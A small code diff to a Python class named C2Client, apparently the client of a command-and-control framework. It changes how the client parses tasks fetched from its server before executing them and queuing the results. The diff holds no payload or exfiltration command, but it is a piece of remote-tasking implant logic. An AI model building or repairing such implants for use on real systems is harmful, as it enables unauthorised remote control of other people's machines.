@@ -148,7 +148,7 @@ class C2Client:
         request["action"] = "get_tasks"
         request["endpoint_id"] = self.endpoint_id
         new_tasks = self.c2_server_transaction(server_message=request)
-        self.tasking_queue = [new_tasks]
+        self.tasking_queue = [new_tasks["response"][0]]
 
     
     def update_tasking(self):
@@ -180,8 +180,8 @@ class C2Client:
             logger.debug(f"tasking queue: {self.tasking_queue}")
             for index, row in enumerate(self.tasking_queue):
                 logger.debug(f"tasking: {row}")
-                task = row["response"][0][1].strip()
-                task_id = row["response"][0][1]
+                task = row[1].strip('"')
+                task_id = row[0]
                 results = self.process_tasking(task)
                 self.tasking_queue[index].append(results)
             self.update_tasking()
